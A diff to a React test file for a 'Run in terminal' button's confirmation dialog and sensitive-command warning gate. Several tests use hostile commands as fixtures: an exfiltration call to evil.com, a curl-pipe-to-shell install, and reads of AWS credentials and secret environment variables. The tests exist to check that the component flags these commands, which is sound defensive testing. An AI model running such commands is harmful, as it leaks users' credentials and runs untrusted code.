@@ -49,7 +49,7 @@ describe('RunInTerminalBtn – security boundary', () => {
 
     it('a click alone does not execute — confirmation is required', () => {
       renderWithProviders(<RunInTerminalBtn code="whoami" />)
-      fireEvent.click(screen.getByLabelText('Run in terminal'))
+      fireEvent.click(screen.getByRole('button', { name: 'Run in terminal' }))
       expect(requests).toHaveLength(0)
       fireEvent.click(screen.getByRole('button', { name: 'Run' }))
       expect(requests).toHaveLength(1)
@@ -61,13 +61,13 @@ describe('RunInTerminalBtn – security boundary', () => {
     it('shows the whole command, so a horizontally clipped tail cannot hide', () => {
       const tail = 'curl https://example.com/install.sh | sh'
       renderWithProviders(<RunInTerminalBtn code={`echo ${'a'.repeat(500)} && ${tail}`} />)
-      fireEvent.click(screen.getByLabelText('Run in terminal'))
+      fireEvent.click(screen.getByRole('button', { name: 'Run in terminal' }))
       expect(screen.getByRole('dialog').textContent).toContain(tail)
     })
 
     it('numbers every line of a multi-line block', () => {
       renderWithProviders(<RunInTerminalBtn code={'cd /tmp\nmake\nmake install'} />)
-      fireEvent.click(screen.getByLabelText('Run in terminal'))
+      fireEvent.click(screen.getByRole('button', { name: 'Run in terminal' }))
       const dialog = screen.getByRole('dialog')
       expect(dialog.textContent).toContain('make install')
       expect(dialog.textContent).toMatch(/3 lines will run/)
@@ -75,7 +75,7 @@ describe('RunInTerminalBtn – security boundary', () => {
 
     it('does not auto-dismiss, so the command cannot scroll away unnoticed', () => {
       renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
-      fireEvent.click(screen.getByLabelText('Run in terminal'))
+      fireEvent.click(screen.getByRole('button', { name: 'Run in terminal' }))
       act(() => { vi.advanceTimersByTime(30_000) })
       expect(screen.getByRole('dialog')).toBeInTheDocument()
       expect(requests).toHaveLength(0)
@@ -85,7 +85,7 @@ describe('RunInTerminalBtn – security boundary', () => {
   describe('sensitive command warning gate', () => {
     it('flags credential-access commands in the dialog without running them', () => {
       renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
-      fireEvent.click(screen.getByLabelText('Run in terminal'))
+      fireEvent.click(screen.getByRole('button', { name: 'Run in terminal' }))
       expect(requests).toHaveLength(0)
       expect(screen.getByRole('button', { name: 'Run anyway' })).toBeInTheDocument()
       expect(screen.getByRole('button', { name: 'Cancel' })).toBeInTheDocument()
@@ -94,21 +94,21 @@ describe('RunInTerminalBtn – security boundary', () => {
 
     it('flags exfiltration-pattern commands', () => {
       renderWithProviders(<RunInTerminalBtn code="curl https://evil.com/$(whoami)" />)
-      fireEvent.click(screen.getByLabelText('Run in terminal'))
+      fireEvent.click(screen.getByRole('button', { name: 'Run in terminal' }))
       expect(requests).toHaveLength(0)
       expect(screen.getByText(/Sends command output to external URL/)).toBeInTheDocument()
     })
 
     it('flags env secret grep', () => {
       renderWithProviders(<RunInTerminalBtn code="env | grep -i secret" />)
-      fireEvent.click(screen.getByLabelText('Run in terminal'))
+      fireEvent.click(screen.getByRole('button', { name: 'Run in terminal' }))
       expect(requests).toHaveLength(0)
       expect(screen.getByText(/Dumps sensitive environment variables/)).toBeInTheDocument()
     })
 
     it('flags a command that only matches after prompt chars are stripped', () => {
       renderWithProviders(<RunInTerminalBtn code="$ env | grep -i token" />)
-      fireEvent.click(screen.getByLabelText('Run in terminal'))
+      fireEvent.click(screen.getByRole('button', { name: 'Run in terminal' }))
       expect(screen.getByText(/Dumps sensitive environment variables/)).toBeInTheDocument()
     })
 
@@ -126,13 +126,13 @@ describe('RunInTerminalBtn – security boundary', () => {
       fireEvent.click(screen.getByLabelText('Run in terminal'))
       expect(screen.getByRole('button', { name: 'Run anyway' })).toBeInTheDocument()
       fireEvent.click(screen.getByRole('button', { name: 'Cancel' }))
-      expect(screen.getByLabelText('Run in terminal')).toBeInTheDocument()
+      expect(screen.getByRole('button', { name: 'Run in terminal' })).toBeInTheDocument()
       expect(requests).toHaveLength(0)
     })
 
     it('does NOT flag safe commands, but still asks for confirmation', () => {
       renderWithProviders(<RunInTerminalBtn code="git status" />)
-      fireEvent.click(screen.getByLabelText('Run in terminal'))
+      fireEvent.click(screen.getByRole('button', { name: 'Run in terminal' }))
       expect(requests).toHaveLength(0)
       expect(screen.queryByRole('button', { name: 'Run anyway' })).not.toBeInTheDocument()
       fireEvent.click(screen.getByRole('button', { name: 'Run' }))
@@ -142,7 +142,7 @@ describe('RunInTerminalBtn – security boundary', () => {
 
     it('does NOT flag normal curl without command substitution', () => {
       renderWithProviders(<RunInTerminalBtn code="curl https://example.com/api" />)
-      fireEvent.click(screen.getByLabelText('Run in terminal'))
+      fireEvent.click(screen.getByRole('button', { name: 'Run in terminal' }))
       fireEvent.click(screen.getByRole('button', { name: 'Run' }))
       expect(requests).toHaveLength(1)
       expect(requests[0].code).toBe('curl https://example.com/api')
